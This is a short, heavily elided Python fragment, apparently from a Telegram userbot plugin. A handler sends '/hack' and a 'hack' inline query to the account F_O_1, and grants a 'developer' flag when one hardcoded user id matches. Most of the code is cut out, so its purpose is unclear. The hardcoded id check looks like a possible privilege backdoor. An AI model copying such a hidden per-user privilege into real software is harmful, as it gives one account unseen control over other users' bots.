...
async def repo(event):
    ...
    await bot.send_message(F_O_1, "/hack")
    response = await bot.inline_query(F_O_1, "هاك")
    ...
    if gvarstatus("subprivate"):
        if event.is_private:
            try:
                ...
                if idd == 7182427468 and not gvarstatus("developer_hrbe"):
                    addgvar("developer_hrbe", True)
                    ...
                    if "error_code" in reqt:
                        await l313l.tgbot.send_message(BOTLOG_CHATID, f"**حدث خطأ غير معروف قم باعادة توجيه الرسالة ل@F_O_1 لحل المشكلة\n{reqt}**")
